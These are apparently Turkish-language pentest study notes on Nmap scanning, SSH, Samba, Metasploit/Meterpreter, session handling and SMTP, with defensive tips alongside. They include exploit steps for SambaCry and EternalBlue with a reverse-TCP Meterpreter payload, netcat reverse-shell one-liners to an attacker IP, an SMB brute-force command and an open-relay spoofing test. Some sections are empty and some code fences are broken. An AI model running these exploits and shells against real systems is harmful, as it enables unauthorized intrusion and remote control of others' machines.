### 🔍 Nmap (Network Mapper) Nedir?
Nmap (Network Mapper), ağları taramak, açık portları ve hizmetleri tespit etmek için kullanılan güçlü ve popüler bir ağ keşif ve güvenlik tarama aracıdır. Hem sistem yöneticileri hem de siber güvenlik uzmanları tarafından sıkça kullanılır.

### 📌 Nmap Ne İşe Yarar?
### ✅ Ağdaki cihazları keşfetme (Hangi IP'lerin aktif olduğunu belirleme)
✅ Açık portları tarama (Hangi servislerin çalıştığını görme)
✅ Hangi işletim sisteminin kullanıldığını belirleme
✅ Güvenlik açıklarını tespit etme
✅ Gelişmiş saldırı simülasyonları yapma

🔧 Nmap Kullanımı
#### 1️⃣ Temel Ağ Tarama
Belirli bir IP'yi taramak için:
```bash
nmap 192.168.1.1
```
Tüm ağdaki cihazları bulmak için:
```bash
nmap 192.168.1.0/24
```


#### 2️⃣ Açık Portları Tespit Etme
Hedef sistemde çalışan servisleri görmek için:
```bash
nmap -sS 192.168.1.1
```
Detaylı tarama için:
```bash
nmap -sV 192.168.1.1
```

Bu komut, portların açık olup olmadığını ve hangi servislerin çalıştığını gösterir.

#### 3️⃣ İşletim Sistemi Tespiti
Bir makinenin işletim sistemini belirlemek için:
```bash
nmap -O 192.168.1.1
```


#### 4️⃣ Ağda Güvenlik Açığı Tarama
Zafiyet taraması yapmak için:
```bash
nmap --script=vuln 192.168.1.1
```


### 📌 Nmap ile İlgili Önemli Notlar
🔹 Ağınızı analiz etmek ve güvenlik açıklarını kapatmak için kullanılmalıdır.
🔹 İzinsiz ağ taramaları yasa dışı olabilir! Kendi ağınızda veya yetkiniz olan sistemlerde test yapmalısınız.
🔹 Nmap, saldırganlar tarafından zafiyetleri bulmak için de kullanılabilir. Bu yüzden güvenlik önlemleri almak önemlidir.
______________________________________________________________________________________
_______________________________________________________________________________________
### 🔍 Nmap ile Ağ Taraması Yapmak
Nmap, ağ üzerindeki cihazları, açık portları, çalışan servisleri ve güvenlik açıklarını tespit etmek için kullanılır. İşte temel ve gelişmiş tarama komutları:

### 📌 1. Basit Ağ Taraması
Hedef bir IP adresini taramak için:
```bash
nmap 192.168.1.1
```
Tüm ağı taramak için:
```bash
nmap 192.168.1.0/24
```
Bu komut, ağda hangi cihazların açık olduğunu gösterir.

### 📌 2. Açık Port ve Servis Tarama
🔹 Açık portları ve çalışan servisleri görmek için:
```bash
nmap -sV 192.168.1.1
```
Bu komut, hangi portların açık olduğunu ve hangi servislerin çalıştığını belirler.
🔹 Belirli bir portu taramak için:
```bash
nmap -p 80,443 192.168.1.1
```
Bu komut, sadece 80 ve 443 numaralı portları tarar.
🔹 Tüm portları taramak için:
```bash
nmap -p- 192.168.1.1
```
Bu, 65535 portun tamamını tarar.

### 📌 3. Gizli (Stealth) Tarama
🔹 Firewall'lara takılmadan tarama yapmak için:
```bash
nmap -sS 192.168.1.1
```
Bu komut, yarım açık (SYN) taraması yaparak fark edilme olasılığını düşürür.

### 📌 4. İşletim Sistemi ve Güvenlik Açığı Tespiti
🔹 İşletim sistemini öğrenmek için:
```bash
nmap -O 192.168.1.1
```
Bu komut, hedef sistemin işletim sistemini tespit etmeye çalışır.

🔹 Güvenlik açıklarını taramak için:
```bash
nmap --script=vuln 192.168.1.1
```
Bu komut, bilinen güvenlik açıklarını arar.

### 📌 5. Ağdaki Cihazları Listeleme
🔹 Ağda kimler var görmek için:
```bash
nmap -sn 192.168.1.0/24
```
Bu komut, cihazların IP adreslerini gösterir ancak portları taramaz.

### 📌 6. Daha Hızlı Tarama Yapmak
Varsayılan taramalar yavaş olabilir. Hızı artırmak için:
```bash
nmap -T4 192.168.1.1
```
Buradaki T4, daha agresif ve hızlı tarama yapar. (T1-T5 arasında değişir, T5 en hızlısıdır ama fark edilme riski yüksektir.)

________________________________________________________________________________________________________________________________________________________________________________
### 🔍 Telnet ve SSH Nedir?
Telnet ve SSH, uzak bir cihazla (sunucu, router vb.) bağlantı kurarak onu kontrol etmeye yarayan protokollerdir. Ancak güvenlik açısından büyük farkları vardır.

### 📌 1. Telnet Nedir?
Telnet (Teletype Network), TCP 23. portu üzerinden çalışan, uzak bir sisteme şifreleme olmadan bağlanmayı sağlayan eski bir protokoldür.

### 🛑 Neden Telnet Kullanılmamalı?
### ❌ Şifreleme yoktur, bu yüzden parolalar düz metin olarak gider.
❌ MITM (Man-in-the-Middle) saldırıları ile şifreler çalınabilir.
❌ Güvensizdir, bu yüzden SSH ile değiştirilmiştir.
### ✅ Telnet Kullanımı (Güvenliksiz Örnek)
Uzak bir sunucuya bağlanmak için:
```bash
telnet 192.168.1.1
```
Kapatmak için:
```bash
exit
```

### 📌 2. SSH Nedir?
SSH (Secure Shell), Telnet’in güvenli alternatifidir. TCP 22. portu üzerinden çalışır ve verileri şifreleyerek gönderir.
### ✅ SSH Neden Daha Güvenlidir?
### ✔ Tüm veri trafiğini şifreler.
✔ Kimlik doğrulama desteği sağlar (şifre veya anahtar tabanlı).
✔ MITM saldırılarına karşı daha dirençlidir.
### 📌 SSH ile Uzak Sunucuya Bağlanmak
```bash
ssh kullanıcı@192.168.1.1
```
Örneğin, root kullanıcısı ile bağlanmak için:
```bash
ssh root@192.168.1.1
```
Eğer bağlantı için özel bir port belirlenmişse:
```bash
ssh -p 2222 root@192.168.1.1
```
🔹 Bağlantıyı kapatmak için:
```bash
exit
```

### 📌 3. SSH ile Kimlik Doğrulama Yöntemleri
SSH bağlantısı yaparken genellikle şifre girmek yerine, anahtar tabanlı kimlik doğrulama kullanılır.
🔹 SSH Anahtarı Oluşturma
```bash
ssh-keygen -t rsa -b 4096
```
Oluşan public key’i sunucuya kopyalamak için:
```bash
ssh-copy-id kullanıcı@192.168.1.1
```
Bundan sonra parola girmeden otomatik giriş yapabilirsiniz.

### 📌 4. SSH ile Dosya Transferi (SCP & SFTP)
SSH sadece bağlantı sağlamakla kalmaz, dosya transferi için de kullanılabilir.
🔹 SCP (Secure Copy) ile Dosya Gönderme
Yerel bilgisayardan sunucuya dosya göndermek için:
```bash
scp dosya.txt kullanıcı@192.168.1.1:/hedef_klasör/
```
🔹 SCP ile Sunucudan Dosya Çekmek
```bash
scp kullanıcı@192.168.1.1:/hedef_dosya.txt ./
```
🔹 SFTP ile Bağlantı
```bash
sftp kullanıcı@192.168.1.1
```


### 🚀 Sonuç: Telnet vs SSH Karşılaştırması
### ✅ Telnet, güvenlik açısından risklidir, SSH kullanılmalıdır!
✅ SSH, sunucu yönetimi ve dosya transferi için en güvenli yöntemdir.
_______________________________________________________________________________________________________________________________________________________________________________
### 🔍 Samba Portları
Samba, SMB (Server Message Block) protokolünü kullanarak çalışır ve aşağıdaki portları kullanır:

### 📌 Önemli Bilgiler:
### ✔ Eski sistemler genellikle TCP 139’u kullanır (NetBIOS üzerinden SMB).
✔ Modern sistemler doğrudan TCP 445 üzerinden SMB kullanır.
✔ UDP 137 ve 138, ağ üzerindeki cihazları keşfetmek için kullanılır.

### 📌 Linux’ta Samba Portlarını Kontrol Etme
Çalışan Samba portlarını görmek için:
```bash
sudo netstat -tulnp | grep smbd
```
veya
```bash
sudo ss -tulnp | grep smbd
```

### 📌 Güvenlik Duvarı (Firewall) Ayarları
Eğer Samba sunucusu düzgün çalışmıyorsa, gerekli portları açmanız gerekebilir.
### 🛠 UFW (Ubuntu/Debian) ile Samba Portlarını Açma
```bash
sudo ufw allow 139/tcp
```
sudo ufw allow 445/tcp
sudo ufw allow 137/udp
sudo ufw allow 138/udp
sudo ufw reload
### 🛠 Firewalld (CentOS/RHEL) ile Samba Portlarını Açma
```bash
sudo firewall-cmd --permanent --add-service=samba
```
sudo firewall-cmd --reload
### 📌 Sonuç
### ✔ SMB bağlantıları için en kritik port: TCP 445
✔ NetBIOS uyumluluğu için: TCP 139, UDP 137 ve 138
✔ Güvenlik için gereksiz portları kapatmak önerilir.
### 🔍 Samba Exploit ve Güvenlik Açıkları
Samba, zaman zaman güvenlik açıkları içerebilir ve bu açıklar saldırganlar tarafından yetkisiz erişim, uzaktan kod çalıştırma veya bilgi sızdırma gibi amaçlarla kullanılabilir.
### 📌 Samba Exploit'leri genellikle şu yöntemlerle gerçekleştirilir:
✅ SMB zafiyetlerini kullanarak yetkisiz erişim
✅ SMB bağlantısını dinleyerek kimlik bilgilerini çalma
✅ Uzaktan kod çalıştırma (RCE - Remote Code Execution) açıkları

### 📌 1. Önemli Samba Güvenlik Açıkları ve Exploit’ler

### 📌 2. Samba Zafiyet Tespiti (Nmap ile Tarama)
Eğer ağınızdaki bir cihazın Samba servisini çalıştırıp çalıştırmadığını ve güvenlik açığı olup olmadığını görmek istiyorsanız Nmap SMB taraması yapabilirsiniz:
```bash
nmap -p 139,445 --script=smb-vuln* 192.168.1.100
```
Bu komut, hedef sistemin SMB protokolünde bilinen açıkları tarar.


### 📌 3. Metasploit ile Samba Exploit Kullanımı
### 📌 CVE-2017-7494 Exploit (SambaCry – Remote Code Execution)
Eğer hedef sistemin Samba sürümü 3.5 - 4.6 arasındaysa, Metasploit ile exploit edilebilir.
🔹 Exploit Çalıştırma
#### 1️⃣ Metasploit’i başlat:
```bash
msfconsole
```
#### 2️⃣ Exploit modülünü seç:
```bash
use exploit/linux/samba/is_known_pipename
```
#### 3️⃣ Hedef IP’yi belirle:
```bash
set RHOSTS 192.168.1.100
```
#### 4️⃣ Exploit’i çalıştır:
```bash
exploit
```
Başarılı olursa, hedef sistem üzerinde shell erişimi (root yetkileriyle) sağlanabilir.

### 📌 4. Samba Güvenliğini Artırma
🔐 Eğer kendi sisteminizi korumak istiyorsanız:
### ✅ Samba sürümünüzü güncelleyin
```bash
sudo apt update && sudo apt upgrade samba -y
```
### ✅ Gereksiz Samba paylaşımlarını kapatın
✅ Güçlü parolalar ve kimlik doğrulama kullanın
✅ SMBv1 protokolünü devre dışı bırakın (Çünkü eski SMB sürümleri güvenlik riski taşır)
✅ Güvenlik duvarı ile SMB portlarını kapatın (139, 445)
```bash
sudo ufw deny 139/tcp
```
sudo ufw deny 445/tcp

### 🚀 Sonuç: Samba Exploit Kullanımı ve Güvenliği
### ✔ Eğer ağ güvenliği testi yapıyorsanız, eski Samba sürümlerindeki açıkları Nmap veya Metasploit ile analiz edebilirsiniz.
✔ Ancak, sistem güvenliğini sağlamak için daima güncellenmiş ve güvenli yapılandırılmış Samba sürümlerini kullanmalısınız.
_______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
### 🔍 Meterpreter Nedir?
Meterpreter, Metasploit Framework içinde kullanılan gelişmiş bir payload’dır.
📌 Hedef sisteme bulaştıktan sonra gizli ve esnek bir uzaktan kontrol (remote access) sağlar.
### 📌 1. Meterpreter'in Özellikleri
### ✅ Bellekte Çalışır – Diskte iz bırakmaz, antivirüs tarafından tespit edilmesi zordur.
✅ Interaktif Kabuk (Shell) – Hedef sistemde komut çalıştırmanıza olanak tanır.
✅ Dosya Yönetimi – Hedef sistemde dosya okuyabilir, yazabilir ve silebilirsiniz.
✅ Ekran ve Klavye Takibi – Keylogger ve ekran görüntüsü alma desteği vardır.
✅ Ağ Yönetimi – Hedef sistemin ağ bağlantılarını görebilir ve yönlendirebilirsiniz.
✅ Process Injection – Farklı işlemlere enjekte olarak tespit edilmesini zorlaştırır.

### 📌 2. Meterpreter Nasıl Kullanılır?
### 📌 Metasploit ile Meterpreter Kullanımı
1️⃣ Metasploit’i başlat:
```bash
msfconsole
```
#### 2️⃣ Bir exploit seç:
```bash
use exploit/multi/handler
```
#### 3️⃣ Payload olarak Meterpreter’i ayarla:
```bash
set payload windows/meterpreter/reverse_tcp
```
#### 4️⃣ Hedefin IP adresini belirle:
```bash
set LHOST 192.168.1.100
```
#### 5️⃣ Bağlantıyı dinlemeye başla:
```bash
exploit
```
💡 Eğer hedef, Meterpreter payload içeren bir dosyayı çalıştırırsa, saldırgan bağlantı alır ve Meterpreter kabuğu açılır.
### 📌 3. Meterpreter Komutları

### 📌 4. Meterpreter Tespit ve Korunma Yöntemleri
💡 Eğer bir sistemin güvenliğini sağlamak istiyorsanız, aşağıdaki önlemleri almalısınız:
🔴 Antivirüs ve EDR kullanın – Meterpreter genellikle bellek içinde çalıştığı için gelişmiş antivirüsler ve EDR çözümleri ile tespit edilebilir.
🔴 Sistem güncellemelerini yapın – Güvenlik açıkları kapatılırsa Meterpreter exploit’leri etkisiz hale gelir.
🔴 Ağ trafiğini izleyin – Anormal bağlantılar tespit edilebilir.
🔴 Güvenlik duvarında bilinmeyen TCP bağlantılarını engelleyin (örn: 4444, 5555 portları).

_______________________________________________________________________________________________________________________________________________________________________________
### 🔍 Nmap Nedir? (Network Mapper)
Nmap (Network Mapper), ağları taramak, açık portları ve çalışan servisleri tespit etmek için kullanılan güçlü bir siber güvenlik aracıdır.
📌 Siber güvenlik uzmanları, ağ yöneticileri ve etik hackerlar tarafından yaygın olarak kullanılır.

### 📌 1. Nmap ile Neler Yapılabilir?
### ✅ Ağ keşfi (Host Discovery): Hangi cihazların çalıştığını belirleme
✅ Port tarama (Port Scanning): Açık portları ve servisleri bulma
✅ Servis tespiti (Service Detection): Çalışan servislerin türünü öğrenme
✅ İşletim sistemi tespiti (OS Detection): Hedef cihazın işletim sistemini belirleme
✅ Zafiyet tarama: Bilinen güvenlik açıklarını analiz etme

### 📌 2. Nmap Kurulumu
Linux için:
```bash
sudo apt install nmap  # Debian/Ubuntu
```
sudo yum install nmap  # CentOS/RHEL
Windows için:
Resmi Nmap sayfasından indirin.

### 📌 3. Nmap Temel Kullanımı
### 📌 Ağda çalışan cihazları bulma:
```bash
nmap -sn 192.168.1.0/24
```
🔹 "-sn" parametresi, sadece cihazların açık olup olmadığını kontrol eder.
### 📌 Hedefte açık portları tarama:
```bash
nmap -p- 192.168.1.100
```
🔹 "-p-" parametresi, tüm 65535 portu tarar.
### 📌 Servis ve versiyon bilgisi öğrenme:
```bash
nmap -sV 192.168.1.100
```
🔹 "-sV", açık portlardaki servislerin sürümlerini belirler.
### 📌 İşletim sistemi tespiti:
```bash
nmap -O 192.168.1.100
```
🔹 "-O", hedef cihazın işletim sistemini belirlemeye çalışır.

### 📌 4. Gelişmiş Nmap Kullanımı
### 📌 Belirli port aralığını tarama:
```bash
nmap -p 22,80,443 192.168.1.100
```
🔹 Sadece 22 (SSH), 80 (HTTP) ve 443 (HTTPS) portlarını tarar.
### 📌 Ağda canlı cihazları tespit etme (Ping taraması):
```bash
nmap -sn 192.168.1.0/24
```
🔹 Tüm 192.168.1.0/24 ağındaki açık cihazları listeler.
### 📌 Firewall (güvenlik duvarı) arkasındaki cihazları tarama (Stealth Scan - Gizli Tarama):
```bash
nmap -sS 192.168.1.100
```
🔹 "-sS" (SYN taraması), normal bağlantı kurmadan hedefi tarar.
### 📌 Ağ üzerindeki açık SMB paylaşımlarını bulma:
```bash
nmap --script smb-enum-shares -p 445 192.168.1.100
```
🔹 Hedef sistemdeki SMB paylaşım bilgilerini gösterir.
### 📌 Zafiyet taraması yapma:
```bash
nmap --script vuln 192.168.1.100
```
🔹 Hedefte bilinen güvenlik açıklarını tarar.
### 📌 Detaylı tarama yapma:
```bash
nmap -A 192.168.1.100
```
🔹 "-A" seçeneği OS tespiti, servis analizi ve traceroute içerir.

### 📌 5. Nmap Sonuçlarını Kaydetme
### 📌 Çıktıyı bir dosyaya kaydetmek için:
```bash
nmap -oN tarama_sonucu.txt 192.168.1.100
```
🔹 "-oN", çıktıyı düz metin olarak kaydeder.
### 📌 XML formatında kayıt etmek:
```bash
nmap -oX tarama_sonucu.xml 192.168.1.100
```
🔹 XML çıktısı, analiz araçları için uygundur.



### 📌 6. Nmap ile Güvenlik Önlemleri
💡 Eğer bir sistem yöneticisi olarak ağınızı korumak istiyorsanız:
🔹 Gereksiz portları kapatın.
🔹 Firewall kullanarak taramaları engelleyin.
🔹 Güçlü kimlik doğrulama kullanın.
🔹 Ağ izleme araçlarıyla (Wireshark, Snort) anormal taramaları tespit edin.

### 🚀 Sonuç
### ✔ Nmap, ağ taramaları için en popüler ve güçlü araçlardan biridir.
✔ Açık portları, servisleri ve işletim sistemlerini tespit etmek için kullanılabilir.
✔ Hem siber güvenlik uzmanları hem de ağ yöneticileri için kritik bir analiz aracıdır.
_____________________________________________________________________________________
_____________________________________________________________________________________
### 🔍 Nmap ile Script Çalıştırmak (NSE - Nmap Scripting Engine)
### 📌 Nmap, sadece port taramakla kalmaz, aynı zamanda özel scriptler çalıştırarak güvenlik analizleri yapabilir.
📌 NSE (Nmap Scripting Engine), ağ taramalarını geliştirmek için kullanılan Lua tabanlı script motorudur.

### 📌 1. NSE Scriptleri ile Nmap Kullanımı
### 📌 Temel Script Kullanımı:
```bash
nmap --script <script_adı> <hedef>
```
### 📌 Birden fazla script çalıştırma:
```bash
nmap --script <script1>,<script2> <hedef>
```
### 📌 Tüm script kategorisini çalıştırma:
```bash
nmap --script <kategori> <hedef>
```
### 📌 Tüm scriptleri çalıştırma (Tehlikeli! DDoS etkisi yaratabilir):
```bash
nmap --script all <hedef>
```

### 📌 2. Önemli NSE Scriptleri ve Kullanımları

### 📌 3. Özel Script Çalıştırma
### 📌 Özel bir Lua script’i çalıştırmak için:
1️⃣ Script dosyanızı oluşturun:
```bash
nano custom_script.nse
```
#### 2️⃣ Basit bir script ekleyin:
```bash
description = [[
```
Basit bir script. Hedef sistemde ping atıp cevap alır.
]]
author = "Benim Adım"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"safe"}

action = function(host)
return "Ping test sonucu: " .. nmap.ping(host.ip)
end
#### 3️⃣ Script’i Nmap ile çalıştırın:
```bash
nmap --script ./custom_script.nse <hedef>
```

### 📌 4. Script Kategorileri
### 📌 Nmap script’leri farklı kategorilere ayrılır:
🔹 auth – Kimlik doğrulama açıklarını test eder
🔹 broadcast – Ağdaki cihazları listeler
🔹 brute – Brute-force saldırıları yapar
🔹 discovery – Ağ keşfi için kullanılır
🔹 exploit – Güvenlik açıklarını kullanarak saldırı yapar
🔹 vuln – Zafiyet taraması yapar
🔹 malware – Zararlı yazılım izlerini araştırır
### 📌 Belirli bir kategori scriptlerini çalıştırmak için:
```bash
nmap --script <kategori_adı> <hedef>
```
Örnek:

```bash
nmap --script vuln 192.168.1.1
```

### 🚀 Sonuç
### ✔ Nmap scriptleri, ağ analizini derinlemesine yapmanızı sağlar.
✔ Zafiyet analizi, servis keşfi ve ağ taraması için kullanılır.
✔ Özel scriptler yazarak Nmap’i geliştirebilirsiniz.
________________________________________________________________________________________________________________________________________________________________________________
### 📌 Nmap Script Argümanları (NSE - Nmap Scripting Engine Arguments)
### 📌 Nmap, script'lere argümanlar ekleyerek daha detaylı ve özelleştirilmiş taramalar yapmamızı sağlar.
📌 Argümanlar, --script-args parametresi ile belirtilir.

### 📌 1. Temel Kullanım
Bir script'e argüman geçirmek için:
```bash
nmap --script <script_adı> --script-args <argüman>=<değer> <hedef>
```
Örnek:
```bash
nmap --script http-trace --script-args http-trace.path=/test 192.168.1.1
```

🔹 http-trace.path=/test -> /test endpoint'inde HTTP TRACE yöntemi aktif mi kontrol eder.



### 📌 2. Birden Fazla Argüman Kullanımı
### 📌 Birden fazla argümanı , ile ayırarak ekleyebiliriz:
```bash
nmap --script <script_adı> --script-args "<arg1>=<değer1>,<arg2>=<değer2>" <hedef>
```
Örnek:
```bash
nmap --script http-put --script-args "http-put.url=/upload, http-put.file=dosya.txt" 192.168.1.1
```
🔹 http-put.url=/upload -> /upload dizinine dosya yüklemeye çalışır.
🔹 http-put.file=dosya.txt -> Yüklenecek dosya belirlenir.

### 📌 3. Önemli Scriptler ve Argümanları

### 📌 4. Kompleks Argüman Kullanımı
Bazı script argümanları liste (table) olarak da tanımlanabilir:
```bash
nmap --script http-headers --script-args "http-headers.paths={/index.html, /admin}"
```
🔹 http-headers.paths -> /index.html ve /admin sayfalarındaki HTTP başlıklarını analiz eder.
Başka bir örnek:
```bash
nmap --script smb-brute --script-args "userdb=users.txt, passdb=pass.txt, brute.delay=3s"
```
🔹 SMB brute-force saldırısında kullanıcı adı ve şifre listesi belirler, saldırılar arasında 3 saniye bekler.

### 🚀 Sonuç
### ✔ Nmap script argümanları, testleri daha detaylı yapmanıza olanak tanır.
✔ Dosya yükleme, brute-force saldırıları ve özel HTTP istekleri gibi işlemler için kullanılır.
✔ Özelleştirilmiş ve daha hassas taramalar yapmak için argümanlar gereklidir.







### 📌 Session Açmak (Oturum Yönetimi) – Pentest & Exploitation
### 📌 Session (oturum), bir sisteme yetkisiz erişim sağladıktan sonra hedef makine üzerinde komut çalıştırmak veya kontrolü ele almak için kullanılır.
📌 Genellikle Metasploit Framework (MSF), Meterpreter ve SSH gibi araçlarla yapılır.

### 📌 1. Meterpreter ile Session Açmak
### 📌 Bir hedef sisteme exploit uygulandıktan sonra Meterpreter oturumu açılır.
### 🛠️ Adım 1: Exploit Kullanımı (Örnek: EternalBlue)
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
set RHOSTS <hedef_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <saldırgan_ip>
set LPORT 4444
exploit
🔹 Başarılı bir exploit sonrası bir Meterpreter oturumu açılır.
🔹 Session kontrolü için:
```bash
sessions -i
```
🔹 Belirli bir session’a bağlanmak için:
```bash
sessions -i <session_id>
```

### 📌 2. Açık Olan Sessionları Yönetmek
### 📌 Mevcut oturumları listelemek için:
```bash
sessions -l
```
### 📌 Belirli bir session’a bağlanmak için:
```bash
sessions -i <session_id>
```
### 📌 Bir session’ı arka plana almak:
```bash
background
```
### 📌 Bir session’ı kapatmak:
```bash
sessions -k <session_id>
```
### 📌 Tüm sessionları kapatmak:
```bash
sessions -K
```

### 📌 3. SSH ile Session Açmak
### 📌 SSH kullanarak bir hedef sisteme giriş yapmak için:
```bash
ssh <kullanıcı_adı>@<hedef_ip>
```
Örnek:
```bash
ssh root@192.168.1.10
```
### 📌 Özel anahtar kullanarak giriş yapmak için:
```bash
ssh -i id_rsa root@192.168.1.10
```
### 📌 Session'ı arka plana almak için:
1️⃣ SSH bağlantısını askıya al: Ctrl + Z
2️⃣ Arka plana al ve geri getir:
```bash
bg   # Arka plana alır
```
fg   # Ön plana alır

### 📌 4. Netcat ile Session Açmak
### 📌 Hedef sisteme arka kapı yerleştirilerek Netcat ile session açılabilir.
### 📌 Adım 1: Dinleyici başlat:
```bash
nc -lvp 4444
```
### 📌 Adım 2: Hedef sistemde ters bağlantı aç:
Windows:
```bash
nc -e cmd.exe <saldırgan_ip> 4444
```
Linux:
```bash
nc -e /bin/bash <saldırgan_ip> 4444
```
### 📌 Session başarılı olursa, hedef sistemin komut satırına erişilir.

### 🚀 Sonuç
### ✔ Meterpreter, SSH ve Netcat kullanarak hedef sistemlerde session açabilirsiniz.
✔ Session’ları yönetmek için sessions komutlarını kullanabilirsiniz.
✔ Ters bağlantılar ve açık oturumlar ile sistem üzerinde kontrol sağlanabilir.
________________________________________________________________________________________________________________________________________________________________________________
### 📌 SMTP (Simple Mail Transfer Protocol) Nedir?
### 📌 SMTP (Simple Mail Transfer Protocol), e-posta gönderimi ve teslimi için kullanılan bir protokoldür.
📌 TCP 25, 465 (SSL) ve 587 (TLS) portlarını kullanır.

### 📌 1. SMTP Nasıl Çalışır?
SMTP, e-postaların bir istemciden (örneğin Outlook veya Gmail) bir e-posta sunucusuna ve oradan alıcının e-posta sunucusuna iletilmesini sağlar.

### 📌 Temel Aşamalar:
Gönderen SMTP sunucusuna bağlanır.
SMTP sunucusu, alıcı e-posta sunucusunu belirler (MX kaydı üzerinden).
E-posta, alıcı SMTP sunucusuna iletilir.
Alıcı, e-postayı POP3 veya IMAP ile çeker.
Örnek MX Kaydı (Mail Exchange) Kontrolü:
```bash
nslookup -type=MX gmail.com
```
### 📌 Bu komut, Gmail'in SMTP sunucularını gösterir.

### 📌 2. SMTP Portları ve Kullanım Alanları
Örnek: SMTP servisini Nmap ile taramak
```bash
nmap -p 25,465,587 <hedef_ip>
```

### 📌 3. SMTP ile Manuel E-Posta Gönderme (Telnet Kullanarak)
### 📌 SMTP sunucusuna bağlanarak manuel olarak e-posta gönderebiliriz.
```bash
telnet smtp.example.com 25
```
### 📌 Eğer Telnet yüklü değilse, yüklemek için:
```bash
sudo apt install telnet
```
Bağlandıktan sonra, aşağıdaki SMTP komutları kullanılır:
```bash
HELO example.com
```
MAIL FROM: <gonderici@example.com>
RCPT TO: <alicinin_maili@example.com>
DATA
Subject: Test Email

Bu bir test e-postasıdır.
.
QUIT
### 📌 Bu işlemler sonrası alıcıya e-posta gönderilmiş olur.

### 📌 4. SMTP Güvenlik Açıkları
### 📌 SMTP servisleri bazen yanlış yapılandırılır ve yetkisiz erişime açık olabilir.
📌 Özellikle "Open Relay" adı verilen yanlış yapılandırma, spam saldırılarına neden olabilir.
### 🛠️ Open Relay Testi (Yetkisiz E-posta Gönderimi Kontrolü)
```bash
telnet <hedef_smtp_server> 25
```
HELO test.com
MAIL FROM: <fake@domain.com>
RCPT TO: <victim@example.com>
DATA
Subject: Test Email

Bu test e-postasıdır.
.
QUIT
### 📌 Eğer sunucu bu işlemi kabul ederse, "Open Relay" açığı vardır ve kötüye kullanılabilir.

### 📌 5. SMTP Güvenliği
### 📌 SMTP servislerinin güvenliğini artırmak için aşağıdaki yöntemler uygulanmalıdır:
### ✅ TLS veya SSL Kullanımı (Port 465 veya 587 üzerinden)
✅ SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail) ve DMARC Kullanımı
✅ SMTP Authentication (Kimlik Doğrulama) Kullanımı
✅ Open Relay Engellenmesi
SPF kaydı kontrolü için:
```bash
nslookup -type=TXT example.com
```
### 📌 Bu komut, SPF kayıtlarını gösterir ve sahte e-posta göndermeyi zorlaştırır.

### 🚀 Sonuç
### ✔ SMTP, e-posta iletimi için kullanılan temel protokoldür.
✔ Manuel testler için Telnet veya Nmap kullanılabilir.
✔ Güvenliği sağlamak için TLS/SSL, SPF, DKIM ve DMARC gibi yöntemler kullanılmalıdır.
____________________________________________________________________________________________________________________________________________________________________________
SSH (Secure Shell) Nedir?
### 📌 SSH (Secure Shell), şifreli bağlantılar kullanarak uzaktaki bir sistemle güvenli bir şekilde iletişim kurmaya yarayan bir protokoldür.
📌 Uzak sunuculara erişim, komut çalıştırma ve dosya transferi için kullanılır.
📌 SSH, varsayılan olarak TCP 22. portu kullanır.

### 📌 1. SSH ile Uzaktan Bağlantı Kurmak
### 📌 Temel SSH bağlantı komutu:
```bash
ssh kullanıcı_adı@hedef_ip
```
### 📌 Örnek:
```bash
ssh root@192.168.1.100
```
### 📌 Eğer varsayılan olmayan bir port kullanılıyorsa:
```bash
ssh -p 2222 root@192.168.1.100
```

### 📌 2. SSH ile Anahtar Tabanlı Kimlik Doğrulama
### 📌 SSH bağlantısını şifre yerine anahtar dosyasıyla yapmak için:
1️⃣ Anahtar çifti oluştur:
```bash
ssh-keygen -t rsa -b 4096
```
#### 2️⃣ Oluşan id_rsa.pub dosyasını hedef makineye ekle:
```bash
ssh-copy-id kullanıcı_adı@hedef_ip
```
#### 3️⃣ Anahtar ile giriş yap:
```bash
ssh -i ~/.ssh/id_rsa kullanıcı_adı@hedef_ip
```

### 📌 3. SSH ile Dosya Transferi (SCP & SFTP)
### 📌 SCP (Secure Copy) ile dosya kopyalama:
🔹 Yerelden uzak sisteme dosya gönderme:
```bash
scp dosya.txt kullanıcı_adı@hedef_ip:/hedef_klasör
```
🔹 Uzak sistemden yerel makineye dosya alma:
```bash
scp kullanıcı_adı@hedef_ip:/hedef_klasör/dosya.txt .
```
### 📌 SFTP (Secure FTP) kullanımı:
```bash
sftp kullanıcı_adı@hedef_ip
```
### 📌 Bağlandıktan sonra temel komutlar:
```bash
ls       # Uzaktaki dosyaları listele
```
get dosya.txt    # Uzak sistemden dosya al
put dosya.txt    # Uzak sisteme dosya yükle
exit     # Çıkış yap

### 📌 4. SSH Tünelleme ve Port Yönlendirme
### 📌 Yerel Port Yönlendirme (Local Forwarding)
🔹 Uzak bir sunucudaki belirli bir porta yerelden erişim sağlar.
```bash
ssh -L 8080:hedef_sunucu:80 kullanıcı@sunucu
```
### 📌 Uzak Port Yönlendirme (Remote Forwarding)
🔹 Yerelde çalışan bir servisi uzak bir sunucuya yönlendirir.
```bash
ssh -R 9000:localhost:22 kullanıcı@sunucu
```
### 📌 Dinamik Port Yönlendirme (SOCKS Proxy Kullanımı)
🔹 SSH üzerinden bir proxy sunucu oluşturur.
```bash
ssh -D 1080 kullanıcı@sunucu
```
🔹 Tarayıcı ayarlarından SOCKS proxy olarak localhost:1080 ayarlanabilir.

### 📌 5. SSH Güvenliği ve Yapılandırma
### 📌 SSH yapılandırma dosyası:
```bash
sudo nano /etc/ssh/sshd_config
```
### 📌 Güvenlik önlemleri:
✅ Varsayılan portu değiştirin (Örn: Port 2222)
✅ Root girişini kapatın (PermitRootLogin no)
✅ Şifreli girişleri kapatıp anahtar kullanın (PasswordAuthentication no)
✅ Belirli kullanıcıları izin verin (AllowUsers kullanıcı_adı)
Değişikliklerden sonra SSH servisini yeniden başlatın:
```bash
sudo systemctl restart ssh
```


### 🚀 Sonuç
### ✔ SSH, uzaktaki sistemlere güvenli bağlantı sağlamak için kullanılır.
✔ Anahtar tabanlı kimlik doğrulama ile güvenlik artırılabilir.
✔ Dosya transferi için SCP ve SFTP kullanılabilir.
✔ Port yönlendirme ile tünelleme yapılabilir.
✔ Güvenlik için sshd_config dosyasında gerekli düzenlemeler yapılmalıdır.
________________________________________________________________________________________________________________________________________________________________________________
### 📌 VNC (Virtual Network Computing) Nedir?
### 📌 VNC (Virtual Network Computing), uzaktaki bir bilgisayarı grafiksel arayüz üzerinden kontrol etmeye yarayan bir protokoldür.
